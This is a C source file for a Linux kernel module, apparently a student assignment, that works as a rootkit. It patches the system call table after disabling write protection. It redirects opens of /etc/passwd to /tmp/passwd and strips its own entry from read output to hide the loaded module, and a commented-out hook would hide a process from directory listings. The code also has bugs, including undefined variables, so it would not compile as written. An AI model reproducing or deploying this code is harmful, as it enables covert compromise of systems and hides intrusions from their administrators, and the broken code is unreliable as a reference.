#include <linux/module.h> // for all modules
#include <linux/init.h>   // for entry/exit macros
#include <linux/kernel.h> // for printk and other kernel bits
#include <asm/current.h>  // process information
#include <linux/sched.h>
#include <linux/highmem.h> // for changing page permissions
#include <asm/unistd.h>    // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW)
  {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  // Implement the sneaky part here
  char *pathname;

  const char *orig_passwd = "/etc/passwd";
  size_t o_size = strlen(orig_passwd);
  const char *temp_passwd = "/tmp/passwd";
  size_t t_size = strlen(temp_passwd);

  // Get the pathname passed to openat
  pathname = (char *)regs->si;

  // Compare with /etc/passwd
  if (strncmp(pathname, orig_passwd, o_size) == 0)
  {
    copy_to_user(pathname, temp_passwd, t_size);
  }
  return (*original_openat)(regs);
}

/* asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{

  long bytes_read;
  char *head;
  unsigned long pos = 0;
  char *sneaky_name = "sneaky_process";
  size_t sneaky_sz = strlen(sneaky_name);

  bytes_read = (*original_getdents64)(fd, dirent, count);
  head = (char *)dirent;

  if (bytes_read <= 0)
  {
    return bytes_read;
  }
  else
  {
    while (pos < bytes_read)
    {
      struct linux_dirent64 *cur = (struct linux_dirent64 *)(head + pos);

      if (strncmp(cur->d_name, sneaky_name, sneaky_sz))
      {

        void *start = dir_entries + pos;
        void *end = dir_entries + pos + cur_dir->d_reclen;
        size_t n_bytes = bytes_read - (pos + cur_dir->d_reclen);
        memmove(start, end, n_bytes);
        bytes_read -= cur_dir->d_reclen;
        break;
      }
      else
      {
        pos += cur->d_reclen;
      }
      pos = pos + cur->d_reclen;
      // pos++;
      // cur += cur->d_reclen;
    }
  }
  return bytes_read;
} */

asmlinkage int (*original_read)(int fd, void *buf, size_t count);

asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
{
  int nbytes;
  char *r_buff;
  const char *mod = "sneaky_mod";
  char *mod_info;
  char *pos;
  // 1. Call original read to read the data into the buffer
  nbytes = (*original_read)(fd, buf, count);
  if (nbytes <= 0)
  {
    printk("Error reading file\n");
    return nbytes;
  }
  r_buff = (char *)buf;

  // 2. Search buffer for sneaky_mod info
  mod_info = strnstr(r_buff, mod, nbytes);
  if (mod_info != NULL)
  {
    for (pos = mod_info; pos < (mod_info + nbytes); pos++)
    {
      if (*pos == '\n')
      {
        char *end = pos + 1; // include the newline
        size_t n_bytes = nbytes - (end - mod_info);
        memmove(start, end, n_bytes);
        nbytes -= (end - mod_info);
        return nbytes;
      }
    }
  }
  return nbytes;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  // original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // You need to replace other system calls you need to hack here
  // sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void)
{
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  // sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
MODULE_LICENSE("GPL");
